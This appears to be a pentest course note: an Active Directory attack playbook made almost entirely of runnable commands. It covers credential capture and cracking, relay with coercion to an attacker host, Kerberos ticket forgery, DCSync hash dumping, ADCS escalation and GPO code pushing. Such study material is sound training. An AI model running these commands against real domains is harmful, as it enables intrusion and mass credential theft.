# 20 — Active Directory Enumeration & Attacks

The biggest module of the path. Concept primer is in [07 Intro AD](07-introduction-to-active-directory.md). This file is the attack playbook.

The mental model: **enumerate → find a credential → reuse / abuse → escalate → repeat**. Each new credential opens a new view of the directory; re-run BloodHound after each step.

## Contents

- [Stage 0 — no credentials](#stage-0-no-credentials)
- [Stage 1 — first valid credential](#stage-1-first-valid-credential)
- [Kerberoasting](#kerberoasting)
- [AS-REP roasting](#as-rep-roasting)
- [Pass-the-hash / Overpass-the-hash / Pass-the-ticket](#pass-the-hash-overpass-the-hash-pass-the-ticket)
- [NTLM relay](#ntlm-relay)
- [ACL abuse](#acl-abuse)
- [Unconstrained delegation](#unconstrained-delegation)
- [Constrained delegation (S4U2Self / S4U2Proxy)](#constrained-delegation-s4u2self-s4u2proxy)
- [DCSync](#dcsync)
- [Golden / Silver / Diamond / Sapphire tickets](#golden-silver-diamond-sapphire-tickets)
- [ADCS — certificate-based escalation (ESC1-ESC16)](#adcs-certificate-based-escalation-esc1-esc16)
- [Trust attacks](#trust-attacks)
- [GPO abuse](#gpo-abuse)
- [Putting it together — a typical AD path](#putting-it-together-a-typical-ad-path)
- [Sources](#sources)

## Stage 0 — no credentials

### Discover the domain

```bash
# DC discovery via DNS SRV
dig SRV _ldap._tcp.dc._msdcs.<DOMAIN> @<DNS>
dig SRV _kerberos._tcp.<DOMAIN> @<DNS>

# RPC / SMB info leak (no auth)
nmap -p139,445 --script smb-os-discovery <T>
netexec smb <T>                                       # banner reveals domain + hostname
netexec smb <T> --shares -u '' -p ''                  # null session
nxc ldap <DC> -u '' -p '' -M ldap-checker             # anon LDAP allowed?

# RootDSE (works against most DCs even without auth)
ldapsearch -x -H ldap://<DC> -s base -b "" "(objectClass=*)"
```

### User / hostname enumeration without creds

```bash
# Kerberos pre-auth — does NOT increment badPwdCount
kerbrute userenum -d <DOMAIN> --dc <DC> users.txt

# RPC null/guest
rpcclient -U "" -N <DC>
> enumdomusers
> enumdomgroups
> querydominfo
> netshareenumall

# RID brute via SMB null/guest
netexec smb <DC> -u '' -p '' --rid-brute
nxc smb <DC> -u guest -p '' --rid-brute
impacket-lookupsid '@<DC>' -no-pass

# AS-REP roast targets discovered without creds (anonymous-bind LDAP only)
GetNPUsers.py <DOMAIN>/ -no-pass -dc-ip <DC> -usersfile users.txt -format hashcat
```

### Network capture — passive credential collection

```bash
# LLMNR / NBT-NS / mDNS poisoning
sudo responder -I tun0 -wd
# Captures NetNTLMv2 hashes when victims fall back to broadcast name resolution.

# Crack
hashcat -m 5600 hashes.txt rockyou.txt -r best64.rule
```

If signing is not enforced on the destination, relay the captured auth instead of cracking — see "NTLM relay" below.

## Stage 1 — first valid credential

### Quick triage for one user

```bash
USER=alice; PASS='Spring2025!'; DC=10.10.10.5; D=corp.local

netexec smb $DC -u $USER -p $PASS                 # validate cred
netexec smb $DC -u $USER -p $PASS --pass-pol      # password policy (avoid lockouts)
netexec smb $DC -u $USER -p $PASS --users --groups
netexec smb $DC -u $USER -p $PASS --shares
netexec ldap $DC -u $USER -p $PASS --asreproast asrep.txt
netexec ldap $DC -u $USER -p $PASS --kerberoasting kerb.txt

# The user can do remote management?
netexec winrm $DC -u $USER -p $PASS --shares
```

### BloodHound

```bash
# Collector (Python — runs from Linux)
bloodhound-python -d $D -u $USER -p $PASS -c All -ns $DC --zip

# SharpHound (run on Windows host)
SharpHound.exe -c All --zipfilename out.zip
```

Import the ZIP into BloodHound CE, then look for:

- **"Find Shortest Paths to Domain Admins"**
- "Find Principals with DCSync Rights"
- Kerberoastable users
- AS-REP-roastable users
- Sessions on the user you control
- Outbound object control (`GenericAll`, `GenericWrite`, `WriteOwner`, `WriteDACL`, `AddMember`, `ForceChangePassword`)

### LDAP enumeration without BloodHound

```bash
# All users
ldapsearch -x -H ldap://$DC -D "$USER@$D" -w "$PASS" -b "DC=corp,DC=local" \
  "(&(objectCategory=person)(objectClass=user))" sAMAccountName memberOf description

# Computers
ldapsearch ... "(objectCategory=computer)" cn dNSHostName operatingSystem

# Kerberoast targets
ldapsearch ... "(servicePrincipalName=*)" sAMAccountName servicePrincipalName

# AS-REP roast targets
ldapsearch ... "(userAccountControl:1.2.840.113556.1.4.803:=4194304)" sAMAccountName

# Pre-canned tools
ldapdomaindump -u "$D\\$USER" -p "$PASS" ldap://$DC
windapsearch -d $D --dc-ip $DC -u $USER -p $PASS -m all
```

## Kerberoasting

Any user can request a TGS for any account that has an SPN. The TGS is encrypted with the service account's key (NT hash for RC4, AES key for AES). Crack offline.

```bash
# Request roastable hashes (Impacket)
impacket-GetUserSPNs -request -dc-ip $DC $D/$USER:$PASS -outputfile kerb.txt

# Force RC4 (more crackable than AES; servers often allow both)
impacket-GetUserSPNs -request -dc-ip $DC $D/$USER:$PASS -outputfile kerb.txt -no-pass    # use $KRB5CCNAME

# Crack
hashcat -m 13100 kerb.txt rockyou.txt -r best64.rule
```

PowerView equivalent on a Windows foothold:

```powershell
Get-DomainUser -SPN | Select samaccountname, serviceprincipalname
Get-DomainUser -SPN | Get-DomainSPNTicket -OutputFormat Hashcat
```

Targeted Kerberoast (when you can write to a target user via ACL): force-add an SPN, request the TGS, remove the SPN.

## AS-REP roasting

Targets accounts with `Do not require Kerberos preauthentication` (UAC bit `4194304`). Without preauth, any one can request an `AS-REP` whose timestamp is encrypted with the user's key — also crackable offline.

```bash
# Without creds (need a user list)
impacket-GetNPUsers $D/ -no-pass -dc-ip $DC -usersfile users.txt -format hashcat -outputfile asrep.txt

# With creds (queries directory itself)
impacket-GetNPUsers -dc-ip $DC -request $D/$USER:$PASS -outputfile asrep.txt

# Crack
hashcat -m 18200 asrep.txt rockyou.txt -r best64.rule
```

## Pass-the-hash / Overpass-the-hash / Pass-the-ticket

```bash
NT=ad3b439...                                      # NT hash (NTLM)

# Pass-the-hash (NTLM)
netexec smb <T> -u alice -H $NT
netexec winrm <T> -u alice -H $NT
evil-winrm -i <T> -u alice -H $NT
xfreerdp /u:alice /d:$D /pth:$NT /v:<T>            # Restricted Admin must be enabled or the host must allow PtH for RDP

impacket-psexec -hashes :$NT $D/alice@<T>
impacket-wmiexec -hashes :$NT $D/alice@<T>
```

Overpass-the-hash — use the NT hash to ask the KDC for a real TGT, then use Kerberos:

```bash
impacket-getTGT $D/alice -hashes :$NT
export KRB5CCNAME=alice.ccache
impacket-psexec -k -no-pass $D/alice@dc01.$D
```

Pass-the-ticket — straight ticket reuse:

```bash
# Convert a Windows .kirbi to ccache (if needed)
impacket-ticketConverter alice.kirbi alice.ccache
export KRB5CCNAME=alice.ccache

# Use Kerberos with -k -no-pass on any Impacket tool
impacket-secretsdump -k -no-pass $D/alice@dc01.$D
```

On Windows:

```powershell
Rubeus.exe asktgt /user:alice /rc4:$NT /domain:$D /dc:dc01 /ptt
Rubeus.exe ptt /ticket:alice.kirbi
klist                                               # confirm
```

## NTLM relay

NTLM authentication flowing across the wire to a server that does **not** require SMB signing (or LDAP channel binding) can be relayed by an attacker who is in the auth path.

```bash
# 1. Identify hosts where signing is NOT required
netexec smb <RANGE> --gen-relay-list relay-targets.txt
# (or: nmap --script smb2-security-mode <RANGE>)

# 2. Stand up the relay
impacket-ntlmrelayx -tf relay-targets.txt -smb2support \
  -of loot/relayed -socks
# Common targets:
#   -t smb://<host>          → execute commands / dump SAM
#   -t ldap://<dc>           → ACL changes, RBCD
#   -t ldaps://<dc>          → ACL changes (channel-binding-tolerant)
#   -t http://<adcs>/certsrv → ESC8 (HTTP enrollment)

# 3. Coerce auth or wait for one
sudo responder -I tun0 -wd                          # passive (poisoning)
PetitPotam.py -u '' -p '' <ATTACKER-IP> <DC>        # MS-EFSR coercion
printerbug.py $D/$USER:$PASS@<TARGET> <ATTACKER>    # MS-RPRN
dfscoerce.py -u $USER -p $PASS <ATTACKER> <TARGET>  # MS-DFSNM
shadowcoerce.py ...                                  # MS-FSRVP
coercer coerce -u $USER -p $PASS -t <TARGET> -l <ATTACKER>
```

A typical relay → escalation chain:

1. Coerce a DC to authenticate to you with `PetitPotam`.
2. `ntlmrelayx` relays that auth to AD CS Web Enrollment (`/certsrv`) and asks for a DC certificate (ESC8).
3. With the DC's certificate, request a TGT for the DC, then DCSync.

## ACL abuse

BloodHound will surface these. Quick mapping:

| Right on target | What you can do |
|---|---|
| `GenericAll` / `GenericWrite` (user) | Force change password, set SPN (kerberoast), set msDS-AllowedToActOnBehalfOfOtherIdentity (RBCD), set Shadow Credentials. |
| `GenericAll` / `GenericWrite` (computer) | RBCD; Shadow Credentials → request a TGT as ANY user including DA. |
| `WriteDACL` | Grant yourself `GenericAll`, then any of the above. |
| `WriteOwner` | Take ownership, then `WriteDACL`. |
| `AddMember` (group) | Add yourself to the group. |
| `ForceChangePassword` (User-Force-Change-Password ext. right) | Reset the user's password. |
| `AllExtendedRights` (DC) | DCSync. |
| `ReadGMSAPassword` | Recover the gMSA service password. |
| `ReadLAPSPassword` (`ms-Mcs-AdmPwd`) | Read LAPS passwords. |

### ForceChangePassword

```bash
# bloodyAD
bloodyAD -d $D -u $USER -p $PASS --host $DC set password target_user 'NewP@ss123!'

# Net (on Windows)
net rpc password "target_user" "NewP@ss123!" -U "$D/$USER%$PASS" -S $DC
```

### AddMember to Domain Admins

```bash
bloodyAD -d $D -u $USER -p $PASS --host $DC add groupMember 'Domain Admins' alice
```

### Shadow Credentials (msDS-KeyCredentialLink)

If you can write to a user/computer's `msDS-KeyCredentialLink`, you can attach a public key, then auth as them via PKINIT.

```bash
# Linux
pywhisker -d $D -u $USER -p $PASS --target target_user --action add
# Output: a PFX + a PIN. Then:
gettgtpkinit.py -cert-pfx target.pfx -pfx-pass <PIN> $D/target_user target.ccache
export KRB5CCNAME=target.ccache
impacket-secretsdump -k -no-pass $D/target_user@dc01.$D
```

Windows: `Whisker.exe add /target:target_user`, then `Rubeus.exe asktgt /user:target_user /certificate:cert.pfx /password:<pin> /ptt`.

### Resource-Based Constrained Delegation (RBCD)

If you can write `msDS-AllowedToActOnBehalfOfOtherIdentity` on a target computer (with `GenericWrite`/`GenericAll`):

```bash
# 1. Need a controlled computer object (or create one via MachineAccountQuota)
impacket-addcomputer -computer-name 'EVIL$' -computer-pass 'Pass1' \
  -dc-host $DC $D/$USER:$PASS

# 2. Grant EVIL$ the right to delegate to <TARGET>
rbcd.py -delegate-from 'EVIL$' -delegate-to '<TARGET>$' \
  -action write $D/$USER:$PASS -dc-ip $DC

# 3. Get a TGS for any user on the target
impacket-getST -spn cifs/<TARGET>.$D -impersonate Administrator \
  -dc-ip $DC $D/'EVIL$':'Pass1'

export KRB5CCNAME=Administrator.ccache
impacket-secretsdump -k -no-pass <TARGET>.$D
```

## Unconstrained delegation

A computer with the `TRUSTED_FOR_DELEGATION` flag receives a copy of every TGT presented to it. Coerce a DC to auth to it → DC's TGT → DCSync.

```bash
# Find unconstrained-delegation hosts
ldapsearch ... "(userAccountControl:1.2.840.113556.1.4.803:=524288)" cn

# On the captured host (e.g. via PrinterBug):
Rubeus.exe monitor /interval:1
# Then trigger:
SpoolSample.py <DC> <unconstrained-host>
# DC's TGT lands in Rubeus; ptt and DCSync.
```

## Constrained delegation (S4U2Self / S4U2Proxy)

Account has `msDS-AllowedToDelegateTo` listing services it can impersonate to.

```bash
# Look up
ldapsearch ... "(msDS-AllowedToDelegateTo=*)" samAccountName msDS-AllowedToDelegateTo

# Use:
impacket-getST -spn cifs/srv01.$D -impersonate Administrator \
  -dc-ip $DC $D/svcaccount:Pass1
```

If `protocol transition` (`TRUSTED_TO_AUTH_FOR_DELEGATION`) is set, you do not need user interaction.

## DCSync

```bash
# Need DS-Replication-Get-Changes + DS-Replication-Get-Changes-All on the domain object
# Default: Domain Admins, Enterprise Admins, Domain Controllers, Administrators

impacket-secretsdump -just-dc-ntlm $D/Administrator:Pass1@$DC
impacket-secretsdump -just-dc       $D/Administrator:Pass1@$DC          # NTLM + Kerberos keys + history

# With hash
impacket-secretsdump -hashes :$NT -just-dc $D/Administrator@$DC

# DCSync just one user
impacket-secretsdump -just-dc-user 'Administrator' $D/Administrator:Pass1@$DC

# Windows
mimikatz # lsadump::dcsync /domain:$D /user:krbtgt
```

`-history` adds previous passwords (useful when current password is changed mid-engagement).

## Golden / Silver / Diamond / Sapphire tickets

Once you have `krbtgt` hash:

```bash
# Golden: forge a TGT as any user, group SIDs of your choice
impacket-ticketer -nthash <KRBTGT_NT> -domain-sid <S-1-5-21-...> -domain $D \
  -groups 512,513,518,519,520 Administrator
# → Administrator.ccache
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass $D/Administrator@dc01.$D
```

Silver tickets — forged TGS for one service, signed with that service account's hash:

```bash
impacket-ticketer -nthash <SVC_NT> -domain-sid <S-1-5-21-...> -domain $D \
  -spn cifs/srv01.$D Administrator
```

Diamond and Sapphire are refinements that fix forensic anomalies in the PAC; same primitive.

## ADCS — certificate-based escalation (ESC1-ESC16)

```bash
# Enumerate templates and issues
certipy find -u $USER@$D -p $PASS -dc-ip $DC -vulnerable -enabled
certipy find -u $USER@$D -p $PASS -dc-ip $DC -stdout
```

Common patterns (study each in detail; this is the cheat row):

| ID | Misconfig | Exploit |
|---|---|---|
| ESC1 | Template allows requester-supplied SAN, low-priv enroll | `certipy req -template ESC1Tmpl -upn administrator@$D ...` |
| ESC2 | "Any Purpose" EKU on a low-priv-enrollable template | `certipy req` then `auth` |
| ESC3 | "Certificate Request Agent" template enrollable by low-priv | Issue agent cert, then enroll-on-behalf-of for DA |
| ESC4 | Template ACL writeable by low-priv | Modify template, then ESC1 |
| ESC5 | PKI object ACL writeable | Modify, then ESC1 |
| ESC6 | CA flag `EDITF_ATTRIBUTESUBJECTALTNAME2` | Any enrollable template + SAN spoofing |
| ESC7 | `Manage CA` / `Manage Certificates` ACL | Approve own request / re-issue someone else's |
| ESC8 | HTTP enrollment endpoint, no channel binding | Coerce DC auth → relay to `/certsrv` → DC cert |
| ESC9 | `CT_FLAG_NO_SECURITY_EXTENSION` on template | Cross-signature replay between users |
| ESC10 | StrongCertificateBindingEnforcement weak / UPN abuse | Mapping a cert to another account |
| ESC11 | RPC enrollment without `IF_ENFORCEENCRYPTICERTREQUEST` | Relay over ICPR |
| ESC13 | OID-group-link issuance | Issued cert grants group membership |
| ESC14 | Writable `altSecurityIdentities` on a target user | Map your cert to the target's identity |
| ESC15 ("EKUwu", CVE-2024-49019) | Schema v1 template + low-priv enroll | Request cert with attacker-chosen EKU + Subject |
| ESC16 | CA-wide `szOID_NTDS_CA_SECURITY_EXT` disabled | ESC9-equivalent at CA scope, no per-template config needed |

```bash
# ESC1 example
certipy req -username $USER@$D -password $PASS -ca <CA-NAME> \
  -template <VULN-TEMPLATE> -upn administrator@$D -dc-ip $DC

certipy auth -pfx administrator.pfx -dc-ip $DC          # → TGT and NT hash
```

## Trust attacks

```bash
# Enumerate trusts
nltest /domain_trusts /all_trusts                                       # Windows
impacket-ldapdomaindump -u "$D\\$USER" -p $PASS ldap://$DC               # includes trusts
bloodhound-python -d $D -u $USER -p $PASS -c Trusts -ns $DC

# Forest trusts: SID history attacks (when SIDFiltering is disabled across the trust)
ticketer.py -nthash <KRBTGT_FOREST_A> -domain-sid <SID_A> -domain forestA.local \
  -extra-sid <SID_OF_ENTERPRISE_ADMIN_IN_FORESTB> Administrator
```

## GPO abuse

If you can edit a GPO (write to its SYSVOL files or to the AD object), you can push code to every machine in scope.

```bash
# Find writeable GPOs
ldapsearch ... -b "CN=Policies,CN=System,DC=corp,DC=local" "(objectClass=groupPolicyContainer)"

# pyGPOAbuse (add scheduled task / immediate task)
pygpoabuse.py -gpo-id "{GUID}" -d $D -u $USER -p $PASS \
  -command 'powershell -enc <b64>' -task-name 'Updater'
```

GPP "cpassword" — historic but still found in old SYSVOL files: AES-decryptable plaintext password.

```bash
gpp-decrypt 'edBSHOwh...'
```

## Putting it together — a typical AD path

```
1. Recon (no creds)        → domain name, DC IP
2. Username enum            → kerbrute / smb null / RID brute
3. Spray a common pwd       → 1 valid cred
4. BloodHound + LDAP enum   → map of who can do what
5. Kerberoast / AS-REP roast → service account hash → crack → priv user
6. ACL abuse / RBCD / ESC1   → admin on a server / cert as DA
7. Dump SAM / LSA / NTDS    → all hashes
8. Lateral (PtH/WinRM/RDP)  → reach business systems
9. Persistence              → silver/golden, skeleton key (lab only)
10. Report                  → see [34](34-documentation-and-reporting.md)
```

## Sources

- The Hacker Recipes — AD: https://www.thehacker.recipes/ad
- HackTricks — AD methodology: https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/
- Specter Ops — Certified Pre-Owned (ADCS): https://posts.specterops.io/certified-pre-owned-d95910965cd2
- ADSecurity blog: https://adsecurity.org/
- Impacket / Certipy / BloodHound / Rubeus / NetExec / bloodyAD official repos.
